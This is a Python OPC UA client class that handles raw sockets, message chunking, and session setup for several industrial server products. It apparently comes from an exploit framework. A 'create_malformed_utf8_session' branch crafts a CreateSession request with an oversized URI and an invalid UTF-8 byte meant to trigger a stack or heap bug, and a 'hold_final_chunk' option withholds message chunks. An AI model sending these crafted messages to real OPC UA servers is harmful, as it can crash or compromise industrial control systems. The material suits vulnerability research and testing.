import socket
import struct
import time
import binascii

from structs import *
from opcua_messages import get_raw_open_session_messages
from config import *

def build_opcua_string(st):
    return {"str_length":len(st), "str":st}

def get_node_id_len_from_packet(bytes_packet):
    auth_byte = ord(bytes_packet[4:5])
    auth_byte = auth_byte & 0xf
    if auth_byte == 0:
        return 1
    elif auth_byte == 1:
        return 4
    elif auth_byte == 3:
        # TODO: get real length
        str_length = struct.unpack("I", bytes_packet[7:11])[0]

        return str_length + 3
    elif auth_byte == 2:
        return 7
    elif auth_byte == 4:
        return 17
    elif auth_byte == 5:
        # TODO: get real length
        str_length = struct.unpack("I", bytes_packet[7:11])[0]
        return str_length + 3
    return 0


class OPCUA():
    def __init__(self, program_type, ip_addr, port, query_string, socket_timeout=DEFAULT_SOCKET_TIMEOUT_SECONDS):
        self.program_type = program_type
        self.ip_addr = ip_addr
        self.port = port
        self.query_string = query_string
        self.seq_number = DEFAULT_SEQ_NUMBER
        self.req_number = DEFAULT_REQ_NUMBER
        self.secure_channel_id = 0
        self.secure_token_id = 0
        self.auth_id = None
        self.socket_timeout = socket_timeout
        self.max_chunk_size = DEFAULT_MAX_CHUNK_SIZE
        self.session_timeout = DEFAULT_SESSION_TIMEOUT
        self.requested_lifetime = DEFAULT_SESSION_REQUESTED_LIFETIME
        self.sock = self.create_socket()

    def get_seq_req_numbers(self, inc_seq=False, inc_req=False):
        if inc_seq:
            self.seq_number += 1
        if inc_req:
            self.req_number += 1
        return self.seq_number, self.req_number

    def opcua_recv(self, prev=b""):
        header = self.sock.recv(8)
        if header[:3] not in (b"MSG", b"ACK", b"OPN", b"HEL"):
            if header[:3] in (b"ERR"):
                opcua_error_packet = self.sock.recv(1024)
                raise Exception("Got OPC UA Error: {} ({})".format(opcua_error_packet[8:], binascii.hexlify(opcua_error_packet).decode()))
            else:
                raise Exception("got bad header: {header}".format(header=header))
        tmp_resp = b""
        message_size = struct.unpack("I", header[4:8])[0]
        header_type = header[3:4]
        payload_size_left = message_size - 8
        while payload_size_left > 0:
            response = self.sock.recv(1)
            tmp_resp += response
            payload_size_left -= len(response)
            if payload_size_left < 0:
                raise Exception("payload_size_left < 0: payload_size_left = {payload_size_left}".format(payload_size_left=payload_size_left))
        if header_type == b"F":
            return header[0:3] + b"F" + struct.pack("I", len(prev + tmp_resp)) + prev + tmp_resp
        else:
            return self.opcua_recv(prev + tmp_resp)

    def opcua_send(self, data, hold_final_chunk=False):
        header = data[:8]
        msg_type = header[0:3]
        msg_size = struct.unpack("I", header[4:8])[0]
        num_chunks = msg_size // self.max_chunk_size
        if msg_size % self.max_chunk_size != 0:
            num_chunks += 1
        secure_channel_id , security_token, seq_num, req_id = struct.unpack("<IIII", data[8:8+16])
        body = data[8+16:]
        if (num_chunks == 1):
            self.sock.send(data)
        else:
            for i in range(num_chunks):
                # We already increased it before
                if i == 0:
                    seq_id, req_id = self.get_seq_req_numbers(inc_seq=False, inc_req=False)
                else:
                    seq_id, req_id = self.get_seq_req_numbers(inc_seq=True, inc_req=False)
                is_last_chunk = i == num_chunks - 1
                if is_last_chunk:
                    if hold_final_chunk:
                        time.sleep(1000000)
                    chunk_type = b'F'
                else:
                    chunk_type = b'C'
                chunk_body = body[self.max_chunk_size * i : self.max_chunk_size * (i+1)]
                chunk_header = struct.pack("<IIII",secure_channel_id , security_token, seq_id, req_id)
                chunk_body = chunk_header + chunk_body
                if chunk_body:
                    chunk_body_len = len(chunk_body)
                    self.sock.send(msg_type + chunk_type + struct.pack("<I", chunk_body_len+8) + chunk_body)

    def send_recv(self, msg, count=1, should_recv=True, hold_final_chunk=False):
        msg_length = len(msg)
        msg = bytearray(msg)
        msg_type = msg[0:3]
        msg[4:8] = struct.pack("I", msg_length)
        for i in range(count):
            # HEL has no seq/req nums
            seq_id, req_id = self.get_seq_req_numbers(inc_seq=True, inc_req=True)
            if msg_type == b"MSG":
                msg[16:20] = struct.pack("I", seq_id)
                msg[20:24] = struct.pack("I", req_id)
            if msg_type == b"OPN":
                msg[71:75] = struct.pack("I", seq_id)
                msg[75:79] = struct.pack("I", req_id)
            self.opcua_send(msg, hold_final_chunk=hold_final_chunk)
        recv = None
        if should_recv:
            recv = self.opcua_recv()
        return recv

    def send_recv_parse(self, msg, construct_obj=OPCUA_MESSAGE):
        res = self.send_recv(msg)
        return construct_obj.parse(res)

    def create_socket(self):
        print("[-] Opening connection to {ip_addr}:{port} (timeout: {timeout})".format(ip_addr=self.ip_addr, port=self.port, timeout=self.socket_timeout))
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.socket_timeout)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.connect((self.ip_addr, self.port))
        return sock

    def close(self, close_session=True):
        if close_session:
            self.close_connection()
        self.sock.close()

    def send_hello_msg(self, count=1, should_recv=True):
        hel_raw, _, _, _ = get_raw_open_session_messages(self.program_type)
        hello_parsed = OPCUA_MESSAGE.parse(hel_raw)
        endpoint_url = "opc.tcp://{ip_addr}:{port}{query_string}".format(ip_addr=self.ip_addr, port=self.port, query_string=self.query_string)
        hello_parsed.opc_data.endpoint_url = build_opcua_string(endpoint_url)
        hello_msg = OPCUA_MESSAGE.build(hello_parsed)
        print("[-] Sending HEL message with {} bytes x {} times".format(len(hello_msg), count))
        self.send_recv(hello_msg, count=count, should_recv=should_recv)

    def send_open_msg(self, open_timestamp=None, special_changes_callback = None, reset_sequence=False):
        _, opn_raw, _, _ = get_raw_open_session_messages(self.program_type)

        opn_parsed = OPCUA_MESSAGE.parse(opn_raw)
        if reset_sequence:
            self.seq_number = opn_parsed.opc_data.sequence_number - 1  # we always increase before use
            self.req_number = opn_parsed.opc_data.request_id_number - 1  # we always increase before use

        if open_timestamp or self.requested_lifetime:
            if open_timestamp:
                print("\t[-] Setting OPN Timestamp to {}".format(open_timestamp))
                opn_parsed.opc_data.object.object.authentication_token.timestamp = open_timestamp
            elif self.requested_lifetime:
                print("\t[-] Setting OPN ReqLifetime to {}".format(self.requested_lifetime))
                opn_parsed.opc_data.object.object.requested_lifetime = self.requested_lifetime
            open_msg = OPCUA_MESSAGE.build(opn_parsed)
        else:
            open_msg = opn_raw

        if special_changes_callback:
            open_msg = special_changes_callback(open_msg)

        print("[-] Sending OPN message with {} bytes".format(len(open_msg)))
        open_resp = self.send_recv_parse(open_msg)

        self.secure_channel_id = open_resp.opc_data.secure_channel_id
        self.secure_token_id = open_resp.opc_data.object.object.security_token.token_id
        print("\t[-] Got Secure Channel Id = {}".format(self.secure_channel_id))

        return self.secure_channel_id, self.secure_token_id


    def send_create_msg(self, session_name=None, reset_sequence=False):
        _, _, create_raw, _ = get_raw_open_session_messages(self.program_type)
        create_session_parsed = OPCUA_MESSAGE.parse(create_raw)

        if reset_sequence:
            self.seq_number = create_session_parsed.opc_data.sequence_number - 1  # we always increase before use
            self.req_number = create_session_parsed.opc_data.request_id_number - 1  # we always increase before use

        create_session_parsed.opc_data.secure_channel_id = self.secure_channel_id
        create_session_parsed.opc_data.security_token_id = self.secure_token_id

        if self.session_timeout:
            create_session_parsed.opc_data.object.object.request_session_timeout = self.session_timeout
        if session_name:
            create_session_parsed.opc_data.object.object.session_name.str = session_name
            create_session_parsed.opc_data.object.object.session_name.str_length = len(session_name)

        create_session_built = OPCUA_MESSAGE.build(create_session_parsed)
        print("[-] Sending Create message with {} bytes".format(len(create_session_built)))
        create_resp = self.send_recv_parse(create_session_built)

        self.auth_id = create_resp.opc_data.object.object.auth_token
        try:
            print(
                "\t[-] Got AuthID = {}".format(self.auth_id.identifier_numeric.item.bytes.hex()))
        except Exception as e:
            print("\t[-] Got AuthID = {}".format(self.auth_id.identifier_numeric.item))
        return self.auth_id


    def send_activate_msg(self, reset_sequence=False):
        _, _, _, activate_raw = get_raw_open_session_messages(self.program_type)

        activate_session_parsed = OPCUA_MESSAGE.parse(activate_raw)
        if reset_sequence:
            self.seq_number = activate_session_parsed.opc_data.sequence_number - 1  # we always increase before use
            self.req_number = activate_session_parsed.opc_data.request_id_number - 1  # we always increase before use
        # Activate
        activate_session_parsed.opc_data.secure_channel_id = self.secure_channel_id
        if self.program_type == PROGRAM_NAME_IGNITION or self.program_type == PROGRAM_NAME_S2OPC:
            activate_session_parsed.opc_data.security_token_id = self.secure_token_id
        activate_session_parsed.opc_data.object.object.auth_token.main_object = self.auth_id
        activate_session_build = OPCUA_MESSAGE.build(activate_session_parsed)
        print("[-] Sending Activate message with {} bytes".format(len(activate_session_build)))
        self.send_recv(activate_session_build)

    def create_session(self, open_timestamp=None, session_name=None, create_malformed_utf8_session=False):
        hel_raw, opn_raw, create_raw, activate_raw = get_raw_open_session_messages(self.program_type)

        msg_opn_parsed = OPCUA_MESSAGE.parse(opn_raw)
        self.seq_number = msg_opn_parsed.opc_data.sequence_number - 2 # we always increase before use, and HEL doesn't need seq/req
        self.req_number = msg_opn_parsed.opc_data.request_id_number - 2 # we always increase before use, and HEL doesn't need seq/req

        # HEL message
        if self.query_string:
            hello_parsed = OPCUA_MESSAGE.parse(hel_raw)
            endpoint_url = "opc.tcp://{ip_addr}:{port}{query_string}".format(ip_addr=self.ip_addr, port=self.port, query_string=self.query_string)
            print("[-] Opening OPC UA session with {endpoint_url}".format(endpoint_url=endpoint_url))
            hello_parsed.opc_data.endpoint_url = build_opcua_string(endpoint_url)
            hello_msg = OPCUA_MESSAGE.build(hello_parsed)
        else:
            hello_msg = hel_raw
        print("[-] Sending HEL message with {} bytes".format(len(hello_msg)))
        self.send_recv(hello_msg)

        # OPN message
        if open_timestamp or self.requested_lifetime:
            opn_parsed = OPCUA_MESSAGE.parse(opn_raw)
            if open_timestamp:
                print("\t[-] Setting OPN Timestamp to {}".format(open_timestamp))
                opn_parsed.opc_data.object.object.authentication_token.timestamp = open_timestamp
            elif self.requested_lifetime:
                print("\t[-] Setting OPN ReqLifetime to {}".format(self.requested_lifetime))
                opn_parsed.opc_data.object.object.requested_lifetime = self.requested_lifetime
            open_msg = OPCUA_MESSAGE.build(opn_parsed)
        else:
            open_msg = opn_raw
        print("[-] Sending OPN message with {} bytes".format(len(open_msg)))
        open_resp = self.send_recv_parse(open_msg)

        self.secure_channel_id = open_resp.opc_data.secure_channel_id
        self.secure_token_id = open_resp.opc_data.object.object.security_token.token_id
        sequence = open_resp.opc_data.sequence_number
        print("\t[-] Got Secure Channel Id = {}".format(self.secure_channel_id))

        # Create
        create_session_parsed = OPCUA_MESSAGE.parse(create_raw)
        create_session_parsed.opc_data.secure_channel_id = self.secure_channel_id

        # Open62541 requires token id be same as channel id
        if self.program_type == PROGRAM_NAME_OPEN62541:
            create_session_parsed.opc_data.security_token_id = self.secure_channel_id
        if self.program_type == PROGRAM_NAME_IGNITION or self.program_type == PROGRAM_NAME_S2OPC:
            create_session_parsed.opc_data.security_token_id = self.secure_token_id

        if self.session_timeout:
            create_session_parsed.opc_data.object.object.request_session_timeout = self.session_timeout
        if session_name:
            create_session_parsed.opc_data.object.object.session_name.str = session_name
            create_session_parsed.opc_data.object.object.session_name.str_length = len(session_name)

        if create_malformed_utf8_session:
            string_application_uri = "A" * 300 # This number can be up to 0x400

            create_session_parsed.opc_data.object.object.application_uri.str_length = len(string_application_uri)
            create_session_parsed.opc_data.object.object.application_uri.str = string_application_uri

            SMALL_STR_SIZE = 4 #10 for heap, 4 for stack
            string_product_uri = "B" * SMALL_STR_SIZE

            create_session_parsed.opc_data.object.object.product_uri.str_length = len(string_product_uri)
            create_session_parsed.opc_data.object.object.product_uri.str = string_product_uri
            create_session_built = OPCUA_MESSAGE.build(create_session_parsed)
            create_session_built = bytearray(create_session_built)
            index = create_session_built.find(string_product_uri.encode("utf-8"))

            # there is no character that is encoded to 0xc8 in utf8. Any incorrect encoding will trigger the bug.
            create_session_built[index + SMALL_STR_SIZE -1] = 0xc8

        else:
            create_session_built = OPCUA_MESSAGE.build(create_session_parsed)
        print("[-] Sending Create message with {} bytes".format(len(create_session_built)))
        create_resp = self.send_recv_parse(create_session_built)

        self.auth_id = create_resp.opc_data.object.object.auth_token

        try:
            print("\t[-] Got AuthID = {}".format(self.auth_id.identifier_numeric.item.bytes.hex()))
        except Exception as e:
            print("\t[-] Got AuthID = {}".format(self.auth_id.identifier_numeric.item))

        # Activate
        activate_session_parsed = OPCUA_MESSAGE.parse(activate_raw)
        activate_session_parsed.opc_data.secure_channel_id = self.secure_channel_id
        if self.program_type == PROGRAM_NAME_IGNITION or self.program_type == PROGRAM_NAME_S2OPC:
            activate_session_parsed.opc_data.security_token_id = self.secure_token_id
        activate_session_parsed.opc_data.object.object.auth_token.main_object = self.auth_id
        activate_session_build = OPCUA_MESSAGE.build(activate_session_parsed)
        print("[-] Sending Activate message with {} bytes".format(len(activate_session_build)))
        self.send_recv(activate_session_build)
        return self.secure_channel_id, self.auth_id, self.seq_number, self.secure_token_id

    def build_opcua_message_header(self):
        message_header = b"MSGF"                                    # Type: MSG Final
        message_header += FAKE_MESSAGE_HEADER_SIZE                  # Message size (will be fixed later)
        message_header += struct.pack("<I", self.secure_channel_id)      # Security Channel ID
        message_header += struct.pack("<I", self.secure_token_id)        # Security Token ID (Only ignition and S2OPC checks it)
        message_header += b"\x00\x00\x00\x00"                       # Sequence number (will be fixed later)
        message_header += b"\x00\x00\x00\x00"                       # Request ID (will be fixed later)
        return message_header

    def build_opcua_message_body(self, type_id, req_id, handle_id=1000009):
        message_body = b""
        message_body += struct.pack("<H", type_id)        # Example: b"\x01\x00" - Type ID - Expanded Node ID four byte encoded number 0x01 with namespace index 0
        message_body += struct.pack("<H", req_id)    # Example: b"\x77\x02" - Read request (631)
        message_body += OBJECT.build(self.auth_id)  # Auth token
        message_body += struct.pack("<Q", dt_to_filetime(datetime.now())) # Timestamp
        message_body += struct.pack("<I", handle_id) # Handle ID
        message_body += struct.pack("<I", 0) # Return Diagnostics
        message_body += struct.pack("<i", -1) # Audit Entry ID
        message_body += struct.pack("<I", 5000) # Timeout Hint
        message_body += b"\x00\x00\x00"  # Additional Header - Extension Object
        return message_body

    def close_connection(self, should_wait=True, use_old_timestap=False, should_print_result=False, should_delete_subscriptions=True):
        # Close Session
        message_header = self.build_opcua_message_header()
        message_body = b""
        message_body += b"\x01\x00"  # Type ID - Expanded Node ID four byte encoded number 0x01 with namespace index 0
        message_body += b"\xd9\x01"  # CloseSession request
        message_body += OBJECT.build(self.auth_id)  # Auth token

        # Should delete subscription
        delete_subscriptions = b"\x01" if should_delete_subscriptions else b"\x00"
        addition_header_extension_object_null = b"\x00\x00\x00"

        old_timestamp = bytes.fromhex("aedd7f39a4ead701")
        new_timestamp = struct.pack("<Q", dt_to_filetime(datetime.now())) # Current Timestamp
        timestamp = old_timestamp if use_old_timestap else new_timestamp

        close_session_body = timestamp + bytes.fromhex("37000000ff030000ffffffff00000000") + addition_header_extension_object_null + delete_subscriptions
        message = message_header + message_body + close_session_body
        print("[-] Sending MSG Request - Close Session")

        should_recv = should_wait or should_print_result
        resp = self.send_recv(message, should_recv=should_recv)
        if should_print_result and resp:
            print(resp)

        # Close channel
        message_header = b"CLOF"                # Type: MSG Final
        message_header += FAKE_MESSAGE_HEADER_SIZE   # Message size
        message_header += struct.pack("<I", self.secure_channel_id)   # Security Channel ID
        message_header += struct.pack("<I", self.secure_token_id)  # Security Token ID
        message_header += b"\x00\x00\x00\x00"   # Sequence number (will be fixed later)
        message_header += b"\x00\x00\x00\x00"   # Request ID (will be fixed later)
        message_body = b""
        message_body += b"\x01\x00" # Type ID - Expanded Node ID four byte encoded number 0x01 with namespace index 0
        message_body += b"\xc4\x01" # CLO Request (631)
        # Auth token is an empty node id in CLO messages
        # message_body += OBJECT.build(auth_id) # Auth token

        clo_body = bytes.fromhex("0000aedd7f39a4ead7010000000000000000ffffffff00000000000000")
        message = message_header + message_body + clo_body
        print("[-] Sending CLO Request")

        resp = self.send_recv(message, should_recv=False)

        # Close connection
        print("[-] Closing connection")
